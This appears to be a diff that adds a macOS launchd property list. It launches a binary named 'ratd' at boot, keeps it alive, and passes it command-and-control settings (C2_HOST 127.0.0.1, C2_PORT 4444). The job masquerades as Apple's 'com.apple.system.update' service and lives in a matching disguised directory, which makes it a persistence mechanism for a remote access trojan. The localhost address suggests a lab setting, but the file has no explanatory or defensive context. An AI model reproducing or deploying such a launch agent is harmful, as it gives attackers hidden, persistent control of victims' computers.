@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>EnvironmentVariables</key>
+	<dict>
+		<key>C2_HOST</key>
+		<string>127.0.0.1</string>
+		<key>C2_PORT</key>
+		<string>4444</string>
+	</dict>
+	<key>KeepAlive</key>
+	<true/>
+	<key>Label</key>
+	<string>com.apple.system.update</string>
+	<key>ProgramArguments</key>
+	<array>
+		<string>/var/com.apple.system.update/ratd</string>
+	</array>
+	<key>RunAtLoad</key>
+	<true/>
+	<key>StandardErrorPath</key>
+	<string>/var/com.apple.system.update/ratd.err</string>
+	<key>StandardOutPath</key>
+	<string>/var/com.apple.system.update/ratd.out</string>
+	<key>WorkingDirectory</key>
+	<string>/var/com.apple.system.update</string>
+</dict>
+</plist>
